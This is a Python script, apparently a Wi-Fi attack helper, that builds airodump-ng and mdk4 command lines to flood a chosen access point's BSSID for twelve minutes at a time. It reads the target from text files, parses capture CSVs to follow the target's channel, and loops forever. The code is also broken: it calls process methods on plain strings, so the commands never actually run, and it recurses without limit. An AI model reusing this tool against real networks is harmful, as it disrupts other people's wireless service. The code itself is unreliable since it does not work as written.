import os
import subprocess
import time
import csv
import sys
import signal
import pandas

GREEN = "\033[32m"
RED = "\033[31m"
RESET = "\033[0m"

with open('cinqgcarte') as f:
    cinqg = f.read()


with open('ssidf.txt') as s:
    ssidf = s.read()

with open('canalf.txt') as c:
    canalf = c.read()

with open('bssidf.txt') as b:
    bssidf = b.read()




print("")  # Deauth a retester.
command = "xterm -hold -bg black -fg blue -e airodump-ng --encrypt wpa" + " " + "-c" + " " + canalf + " " + cinqg
time.sleep(20)
cmd = "xterm -hold -bg black -fg blue -e mdk4" + " " + cinqg + " " + "e -t" + " " + bssidf + " " + "-l"
time.sleep(720)
command.terminate()
command.wait()
command.kill()
cmd.terminate()
cmd.wait()
cmd.kill()


def airodumpcheckcinqg():
    print("")
    if os.path.isfile('airodumpencours.txt'):
        print(".")
        time.sleep(12)
        os.system("rm -rf airodumpencours.txt")
        airodumpcheckcinqg()
    else:
        print("")
    global deuxg
    global ssid
    global canal
    global bssid
    with open('deuxgcarte') as f:
        deuxg = f.read()

    with open('ssid.txt') as s:
        ssid = s.read()

    with open('canalf.txt') as c:
        canal = c.read()

    with open('bssidf.txt') as b:
        bssid = b.read()

        os.system("touch airodumpencours.txt")
        command = "xterm -hold -bg black -fg blue -e airodump-ng --bssid" + " " + bssid + " " + cinqg + " " + "-w airodumpcheck2g --output-format csv"
        time.sleep(8)
        command.terminate()
        command.wait()
        command.kill()          

        os.system("rm -rf channel.txt")
        df = pandas.read_csv("airodumpcheck2g-01.csv")  # Fichier qui .csv qui sert à l'analyse
        df.columns = ['BSSID', 'First time seen', 'Last time seen', 'channel', 'Speed', 'Privacy', 'Cypher',
                      'Atuthentication', 'Power', '# beacons', '# IV', 'LAN IP', 'ID-lenght', 'ESSID', 'Key']
        df = df[['channel']]  # Filtrage des colonnes avec pandas pour garder uniquement l'essentiel
        df.to_csv('check2g.csv', index=False)

        infilemid = "check2g.csv"  # Nouveau fichier généré par pandas avec les 5 colonnes uniquement.On le garde pour la suite.
        outfilemid = "check2G.csv"  # Second filtre appliqué sur le fichier pandas pour enlever les espaces et caractères spéciaux du csv

        delete_list = [".0", " ", "channel", "Power"]  # Suppression des caractères et espaces inutiles dans le midvalues.csv
        with open(infilemid) as fin, open(outfilemid, "w+") as fout:
            for line in fin:
                for word in delete_list:
                    line = line.replace(word, "")
                fout.write(line)

        os.system("sed '/^-/d' check2G.csv > ch.csv")

        with open('ch.csv') as cards:  # Placement des données dans les fichiers textes sans caractères inutiles après le second filtre sur midvalues1.csv
            csv_reader = csv.reader(cards)
            for line in cards:
                words = line.split()
                for i in words:
                    for letter in i:
                        if (letter.isdigit()):
                            print(letter)
                            f = open(f'channel.txt', 'w+')
                            f.write(line)
                            f.close()
        os.system("rm -rf *.csv")
        os.system("rm -rf airodumpencours.txt")
        os.system("sed -i '/^$/d' channel.txt")
        print("")
        mdk3()

def mdk3():
    with open('cinqgcarte') as f:
        cinqg = f.read()

    with open('ssidf.txt') as s:
        ssidf = s.read()

    with open('canalf.txt') as c:
        canalf = c.read()

    with open('bssidf.txt') as b:
        bssidf = b.read()

    print("")
    command = "xterm -hold -bg black -fg blue -e airodump-ng --encrypt wpa" + " " + "-c" + " " + canalf + " " + cinqg
    time.sleep(20)
    cmd = "xterm -hold -bg black -fg blue -e mdk4" + " " + cinqg + " " + "e -t" + " " + bssidf + " " + "-l"
    time.sleep(720)
    command.terminate()
    command.wait()
    command.kill()
    cmd.terminate()
    cmd.wait()
    cmd.kill()
    print("")
    pass

starttime = time.monotonic()
while True:
  time.sleep(1.0 - ((time.monotonic() - starttime) % 1.0))
  airodumpcheckcinqg()



